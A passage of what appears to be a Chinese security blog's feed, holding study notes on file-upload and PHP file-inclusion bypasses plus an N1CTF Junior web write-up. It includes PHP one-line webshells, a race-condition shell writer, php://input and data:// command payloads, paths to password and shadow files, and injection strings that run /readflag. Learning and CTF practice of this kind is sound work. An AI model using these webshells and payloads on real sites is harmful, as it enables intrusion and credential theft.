title="图片马绕过"></a>图片马绕过</h3><p>生成图片马:</p><ol><li><p>在路径下准备好<code>一句话木马.php</code>和<code>一张图片.png</code> (或者 .jpg )</p></li><li><p>输入系统指令:<code>copy 一张图片.png/b+一句话木马.php/a 生成图片名称.png</code></p></li></ol><p>之后利用文件包含漏洞,使其以php解析图片马生效</p><h3 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h3><p>若网站对图片等进行二次渲染，那么可以上传正常的GIF图片下载回显的图片，用010Editor编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话木马，上传带有PHP一句话木马的GIF图片(即不会被此后台渲染的图片马)</p><p>之后可再通过文件包含等方法利用此图片马</p><p><strong>注意</strong>:二次渲染不会渲染已经被渲染过的文件,我们可以将第一次渲染后的图片写入一句话木马再进行上传就不会被渲染</p><h3 id="文件条件竞争"><a href="#文件条件竞争" class="headerlink" title="文件条件竞争"></a>文件条件竞争</h3><p>若后台删除我们上传的非法文件或修改后缀名,则可以上传这样的php文件:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问到后能在目录下写入一句话木马文件shell.php,之后我们连接写入后的文件shell.php就好了</p><p>而关键在于需要在删除前访问到这个非法文件,可以利用bp的intruder模块多线程发包,同时用bp不停访问或者写脚本实现这个功能</p><h2 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h2><p>常见文件头:</p><p>GIF：47 49 46 38 39 61<br>png：89 50 4E 47 0D 0A 1A 0A<br>JPG：FF D8 FF E0 00 10 4A 46 49 46</p><p><strong>注</strong>:上面的文件头的格式是16进制的格式</p><p>在进行<code>文件头绕过</code>时，我们可以把上面的<code>文件头</code>添加到我们的<code>一句话木马的16进制文件</code>最前面，达到绕过文件头检测的目的。</p><p><strong>小trick</strong>:可以在写一句话木马时,在<code>文件内容的最前面</code>写入同样的字符占位,之后便于在16进制编辑器中修改为文件头</p><h2 id="服务器解析漏洞利用"><a href="#服务器解析漏洞利用" class="headerlink" title="服务器解析漏洞利用"></a>服务器解析漏洞利用</h2><h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p>Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。</p><p>比如test.php.a.b的<code>.a</code>和<code>.b</code>这两种后缀是apache不可识别解析，apache就会把test.php.a.b解析成test.php。</p><h3 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h3><p>IIS6.0解析漏洞分两种：</p><ul><li><p>目录解析：以<code>xx.asp</code>命名的文件夹里的文件都将会被当成<code>ASP文件</code>执行。</p></li><li><p>文件解析：<code>xx.asp;.jpg</code>像这种畸形文件名在;后面的直接被忽略，也就是说当成<code>xx.asp</code>文件执行。</p></li></ul><p>IIS6.0默认的可执行文件除了<code>asp</code>还包含这三种<code>.asa .cer .cdx</code>。</p><h3 id="IIS7-0-IIS7-5-Nginx解析漏洞"><a href="#IIS7-0-IIS7-5-Nginx解析漏洞" class="headerlink" title="IIS7.0 | IIS7.5 | Nginx解析漏洞"></a>IIS7.0 | IIS7.5 | Nginx解析漏洞</h3><p>Nginx拿到文件路径（更专业的说法是URI）<code>/test.jpg/test.php</code>后，一看后缀是<code>.php</code>，便认为该文件是<code>php文件</code>，转交给php去处理。php一看<code>/test.jpg/test.php</code>不存在，便删去最后的<code>/test.php</code>，又看<code>/test.jpg</code>存在，便把<code>/test.jpg</code>当成<code>要执行的文件</code>了，又因为后缀为<code>.jpg</code>，php认为这不是php文件，于是返回<code>Access denied</code>。</p><p>这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。</p><p>举个例子: 当php遇到文件路径<code>/1.jpg/2.txt/3.php</code>时，若<code>/1.jpg/2.txt/3.php</code>不存在，则会去掉最后的<code>/3.php</code>，然后判断<code>/1.jpg/2.txt</code>是否存在，若存在，则把<code>/1.jpg/2.txt</code>当做文件<code>/1.jpg/2.txt/3.php</code>，若<code>/1.jpg/2.txt</code>仍不存在，则继续去掉<code>/2.txt</code>，以此类推。</p><p>另外两种解析漏洞：<br><code>www.xxxxx.com/UploadFiles/image/1.jpg%00.php www.xxxxx.com/UploadFiles/image/1.jpg/%20\0.php</code></p><h2 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h2><p>有的waf在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。</p><p>另外，Waf和Web系统对 boundary 的处理不一致，可以使用错误的 boundary 来完成绕过。</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-PHP文件包含</title>
      <link href="/2024/02/06/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2024/02/06/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h2><p>利用文件包含漏洞,将服务器本地文件包含进页面</p><h3 id="系统敏感文件或者配置文件"><a href="#系统敏感文件或者配置文件" class="headerlink" title="系统敏感文件或者配置文件"></a>系统敏感文件或者配置文件</h3><p>windows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini <span class="comment">//查看系统版本</span></span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml <span class="comment">//IIS配置文件</span></span><br><span class="line">C:\windows\repair\sam <span class="comment">//存储Windows系统初次安装的密码</span></span><br><span class="line">C:\ProgramFiles\mysql\my.ini <span class="comment">//Mysql配置</span></span><br><span class="line">C:\ProgramFiles\mysql\data\mysql\user.MYD <span class="comment">//MySQL root密码</span></span><br><span class="line">C:\windows\php.ini <span class="comment">//php配置信息</span></span><br></pre></td></tr></table></figure><p>Linux&#x2F;Unix</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/password <span class="comment">//账户信息</span></span><br><span class="line">/etc/shadow <span class="comment">//账户密码信息</span></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf <span class="comment">//Apache2默认配置文件</span></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf <span class="comment">//虚拟网站配置</span></span><br><span class="line">/usr/local/app/php5/lib/php.ini <span class="comment">//PHP相关配置</span></span><br><span class="line">/etc/httpd/conf/httpd.conf <span class="comment">//Apache配置文件</span></span><br><span class="line">/etc/my.conf <span class="comment">//mysql配置文件</span></span><br></pre></td></tr></table></figure><p>其中也可以用相对路径<code>?file=../../../etc/passwd</code></p><p>还可以加一些不存在的目录名，进行穿越、绕过,例如:<code>?file=/etc/xxxxxxx/../passwd</code></p><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>一般是利用伪协议报错后使用</p><p>首先利用访问错误url或者加入参数，来植入php等代码<br>访问数据存入<code>access.log</code>或<code>error.log</code>等日志文件，通过尝试试探这些文件的路径和文件名，去包含执行代码。</p><p>如默认路径：<br><code>/var/log/apache2/access.log</code><br><code>/var/log/nginx/access.log</code></p><h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><p>在文件上传的时候，会产生临时文件，phpinfo();可以读取文件的路径和名字，然后本地包含产生后门，在临时文件删除前去包含文件,这里可能要会写相应脚本;</p><p>路径：<code>/tmp</code></p><h3 id="ssh日志"><a href="#ssh日志" class="headerlink" title="ssh日志"></a>ssh日志</h3><p>默认路径：<code>/var/log/auth.log</code></p><p>利用ssh连接<br>先执行命令<code>ssh  &#39;&lt;?php ...?&gt;&#39; @remotehost</code></p><p>操作会被写入日志，再进行包含</p><h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>默认路径：<code>/proc/1/environ/</code></p><p>利用：在请求包<code>user-agent</code>字段中插入php代码，再进行文件包含</p><h3 id="包含fd-文件描述符"><a href="#包含fd-文件描述符" class="headerlink" title="包含fd(文件描述符)"></a>包含fd(文件描述符)</h3><p>默认路径：<code>/proc/self/fd/</code></p><p>同包含environ相似</p><h3 id="session文件"><a href="#session文件" class="headerlink" title="session文件"></a>session文件</h3><p>默认路径：var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;</p><p>要灵活利用可控变量，插入php代码，再进行包含</p><h2 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2.远程文件包含"></a>2.远程文件包含</h2><p>若服务器允许包含远程文件，则可利用文件包含读取另外一台服务器上的恶意脚本</p><p><strong>条件</strong>：allow_url_fopen、allow_url_include为on</p><h2 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="3.伪协议"></a>3.伪协议</h2><h3 id="file-访问本地文件系统"><a href="#file-访问本地文件系统" class="headerlink" title="file:&#x2F;&#x2F;访问本地文件系统"></a>file:&#x2F;&#x2F;访问本地文件系统</h3><p><code>file://文件的绝对路径或文件名</code></p><h3 id="php-filter查看源代码或写入代码"><a href="#php-filter查看源代码或写入代码" class="headerlink" title="php:&#x2F;&#x2F;filter查看源代码或写入代码"></a>php:&#x2F;&#x2F;filter查看源代码或写入代码</h3><p>读取index.php的源码并转换成base64编码显示在页面:<br><code>php://filter/read=convert.base64-encode/resource=index.php</code></p><p>将helloworld用base64编码写入test.txt:<br><code>php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=helloworld</code></p><p>同样,也可以进行目录穿越:<code>?file=php://filter/read=convert.base64-encode/xxxxxxxxxx/resource=index.php</code></p><p>绕过:<a href="https://blog.csdn.net/2301_77004573/article/details/130565745#:~:text=%E8%A1%A5%E5%85%85%E5%A7%BF%E5%8A%BF%EF%BC%9A.iconv%E6%94%AF%E6%8C%81utf-7%2Cutf-8%2CUCS-2LE%2CUCS-2BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8n%E6%8B%BC%E6%8E%A5%E8%AF%AD%E5%8F%A5%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BD%93utf%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6%E5%8F%AF%E4%BB%A5%E7%94%A8ut%250Af%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E3%80%82%204.%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%8F%A5%EF%BC%9A%20php%3A%2F%2Ffilter%2F%20write,%3Dconvert.base64-%20decode%20%2Fresource%3D%20shell.php">https://blog.csdn.net/2301_77004573/article/details/130565745#:~:text=%E8%A1%A5%E5%85%85%E5%A7%BF%E5%8A%BF%EF%BC%9A.iconv%E6%94%AF%E6%8C%81utf-7%2Cutf-8%2CUCS-2LE%2CUCS-2BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8n%E6%8B%BC%E6%8E%A5%E8%AF%AD%E5%8F%A5%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BD%93utf%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6%E5%8F%AF%E4%BB%A5%E7%94%A8ut%250Af%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E3%80%82%204.%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%8F%A5%EF%BC%9A%20php%3A%2F%2Ffilter%2F%20write,%3Dconvert.base64-%20decode%20%2Fresource%3D%20shell.php</a></p><h3 id="php-input进行命令执行"><a href="#php-input进行命令执行" class="headerlink" title="php:&#x2F;&#x2F;input进行命令执行"></a>php:&#x2F;&#x2F;input进行命令执行</h3><p>可以将php代码以post请求形式发送执行但要求allow_url_include为on</p><p>例如利用漏洞列出当前目录下的文件和文件夹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: xxx.com?file=php:<span class="comment">//input</span></span><br><span class="line">POST: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;dir&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="data-发送执行"><a href="#data-发送执行" class="headerlink" title="data:&#x2F;&#x2F;发送执行"></a>data:&#x2F;&#x2F;发送执行</h3><p><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==</code></p><p><strong>注</strong>:<code>PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==</code>为<code>&lt;?php system(&quot;dir&quot;);?&gt;</code>base64编码的结果</p><p>条件：allow_url_fopen、allow_url_include为on</p><h3 id="phar-或zip-执行压缩包中的恶意文件"><a href="#phar-或zip-执行压缩包中的恶意文件" class="headerlink" title="phar:&#x2F;&#x2F;或zip:&#x2F;&#x2F;执行压缩包中的恶意文件"></a>phar:&#x2F;&#x2F;或zip:&#x2F;&#x2F;执行压缩包中的恶意文件</h3><p>结合文件上传写一个一句话木马的文件<code>shell_dir.php</code>，将<code>shell_dir.php</code>压缩成<code>shell_dir.zip</code>，然后把压缩包重命名为<code>shell_dir_zip.png</code></p><p>然后上传<code>shell_dir_zip.png</code></p><p>那么利用<code>phar://shell_dir_zip.png/shell_dir.php</code>这样的语句可以直接执行压缩包内的木马文件</p><p>而<code>zip://</code>伪协议作用一样,但需要改为<code>zip://shell_dir_zip.png#shell_dir.php</code>这样的格式</p><h2 id="4-绕过方式"><a href="#4-绕过方式" class="headerlink" title="4.绕过方式"></a>4.绕过方式</h2><h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><p>在包含的文件名中固定了文件后缀名</p><p>绕过：利用<code>%00截断</code>,条件:<code>php&lt;5.3.4;gpc为off</code></p><h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>用正则过滤<code>/,../,</code>等</p><p>进行<code>URL编码</code>，如果WAF中是<code>字符串匹配</code>，可以使用<code>url多次编码</code>的方式可以绕过</p><h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为<code>259个bytes</code>。</p><p>那么在长度有限的时候，<code>././././ (n个)</code> 的形式就可以通过这个把路径爆掉 ，在php代码包含中，这种绕过方式要求<code>php版本 &lt; php 5.2.8</code></p><h2 id="5-一些进阶利用"><a href="#5-一些进阶利用" class="headerlink" title="5.一些进阶利用"></a>5.一些进阶利用</h2><p>参考:<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届N1CTF Junior-web</title>
      <link href="/2024/02/02/CTF-%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-web/"/>
      <url>/2024/02/02/CTF-%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-web/</url>
      
        <content type="html"><![CDATA[<h2 id="zako"><a href="#zako" class="headerlink" title="zako"></a>zako</h2><p>题目源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//something hide here</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;__secret.xswl.io&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&gt;<span class="number">70</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no, &gt;70&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你就不能绕一下喵&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;./execute.sh &#x27;&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>execute.sh源码:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">reject</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">XXXCMD=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">awk -v str=<span class="string">&quot;<span class="variable">$&#123;XXXCMD&#125;</span>&quot;</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">BEGIN &#123;</span></span><br><span class="line"><span class="string">    deny=&quot;`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-&quot;;</span></span><br><span class="line"><span class="string">    for (i = 1; i &lt;= length(str); i++) &#123;</span></span><br><span class="line"><span class="string">        char = substr(str, i, 1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        for (x = 1; x &lt; length(deny) + 1; x++) &#123;</span></span><br><span class="line"><span class="string">            r = substr(deny, x, 1);</span></span><br><span class="line"><span class="string">            if (char == r) exit 1;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">[ $? -ne 0 ] &amp;&amp; reject <span class="string">&quot;NOT ALLOW 1&quot;</span></span><br><span class="line"></span><br><span class="line">eval_cmd=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;XXXCMD&#125;</span>&quot;</span> | awk -F <span class="string">&quot;|&quot;</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">BEGIN &#123;</span></span><br><span class="line"><span class="string">    allows[1] = &quot;ls&quot;;</span></span><br><span class="line"><span class="string">    allows[2] = &quot;makabaka&quot;;</span></span><br><span class="line"><span class="string">    allows[3] = &quot;whoareu&quot;;</span></span><br><span class="line"><span class="string">    allows[4] = &quot;cut~no&quot;;</span></span><br><span class="line"><span class="string">    allows[5] = &quot;grep&quot;;</span></span><br><span class="line"><span class="string">    allows[6] = &quot;wc&quot;;</span></span><br><span class="line"><span class="string">    allows[7] = &quot;杂鱼杂鱼&quot;;</span></span><br><span class="line"><span class="string">    allows[8] = &quot;netstat.jpg&quot;;</span></span><br><span class="line"><span class="string">    allows[9] = &quot;awsl&quot;;</span></span><br><span class="line"><span class="string">    allows[10] = &quot;dmesg&quot;;</span></span><br><span class="line"><span class="string">    allows[11] = &quot;xswl&quot;;</span></span><br><span class="line"><span class="string">&#125;&#123;</span></span><br><span class="line"><span class="string">    num = 1;</span></span><br><span class="line"><span class="string">    for (i = 1; i &lt;= NF; i++) &#123;</span></span><br><span class="line"><span class="string">        for (x = 1; x &lt;= length(allows); x++) &#123;</span></span><br><span class="line"><span class="string">            cmpstr = substr($i, 1, length(allows[x]));</span></span><br><span class="line"><span class="string">            if (cmpstr == allows[x])</span></span><br><span class="line"><span class="string">                eval_cmd[num++] = $i;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">END &#123;</span></span><br><span class="line"><span class="string">    for (i = 1; i &lt;= length(eval_cmd); i++) &#123;</span></span><br><span class="line"><span class="string">        if (i != 1)</span></span><br><span class="line"><span class="string">            printf &quot;| %s&quot;, eval_cmd[i];</span></span><br><span class="line"><span class="string">        else</span></span><br><span class="line"><span class="string">            printf &quot;%s&quot;, eval_cmd[i];</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[ <span class="string">&quot;<span class="variable">$&#123;XXXCMD&#125;</span>&quot;</span> = <span class="string">&quot;&quot;</span> ] &amp;&amp; reject <span class="string">&quot;NOT ALLOW 2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span> <span class="variable">$&#123;eval_cmd&#125;</span></span><br></pre></td></tr></table></figure><p>这是一个sh脚本,设置了11个白名单<br>其实有用的也就3个<code>wc、ls、grep</code></p><ul><li>wc：查看文件行数情况，不可以读取内容</li><li>grep：读取文件内容</li><li>ls：列出目录</li></ul><hr><p>题设背景交代好了,接下来分析一下</p><p>我们发现开始的源码是有隐藏的,利用白名单中的函数先读取一下网页源码</p><p>先ls出来文件结构,发现<code>excute.sh</code>和<code>index.php</code>并且<code>ls /</code>出来发现flag和readflag两个可能藏有答案的文件</p><p>那么首先可以先获取出隐藏部分的源码:<code>/?.[secret.xswl.io=grep &quot;&quot; ?ndex.php</code>(其中通过fuzz发现index被过滤所以通配符绕过一下)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//something hide here</span></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat &quot;</span>.<span class="keyword">__FILE__</span>.<span class="string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;__secret.xswl.io&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&gt;<span class="number">70</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no, &gt;70&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你就不能绕一下喵&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;./execute.sh &#x27;&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么在shell环境中的黑名单以及sh脚本中的白名单的双重waf正常直接执行命令很难达到目的</p><p>我们考虑是否可以绕过sh脚本执行,在自创的php文件中执行命令呢,payload如下:</p><p><code>?.[secret.xswl.io=grep &quot;&lt;?php&quot; ?ndex.php &gt;&gt; 1.php</code>(意思是利用grep读取题目源码:index.php中的含”&lt;?php”行的内容写入1.php,以下同理)<br><code>?.[secret.xswl.io=grep &quot;highlight&quot; ?ndex.php &gt;&gt; 1.php</code><br><code>?.[secret.xswl.io=grep &quot;REQUEST&quot; ?ndex.php &gt;&gt; 1.php</code><br><code>?.[secret.xswl.io=grep &quot;system&quot; ?ndex.php &gt;&gt; 1.php</code></p><p>这样下来我们就成功构造了一个php文件(不写入黑名单过滤那行代码)以便于我们在其中执行命令:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat &quot;</span>.<span class="keyword">__FILE__</span>.<span class="string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;__secret.xswl.io&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;./execute.sh &#x27;&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接下来闭合后在1.php中执行命令,payload:<code>/1.php?.[secret.xswl.io=ls&#39;;cat /flag&#39;</code></p><p>发现是假flag,那么就尝试利用system执行readflag文件,最终payload:<code>/1.php?.[secret.xswl.io=ls&#39;;/readflag;&#39;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新周记3</title>
      <link href="/2024/02/02/%E5%91%A8%E8%AE%B0-2024-02-02-%E6%96%B0%E5%91%A8%E8%AE%B03/"/>
      <url>/2024/02/02/%E5%91%A8%E8%AE%B0-2024-02-02-%E6%96%B0%E5%91%A8%E8%AE%B03/</url>
      
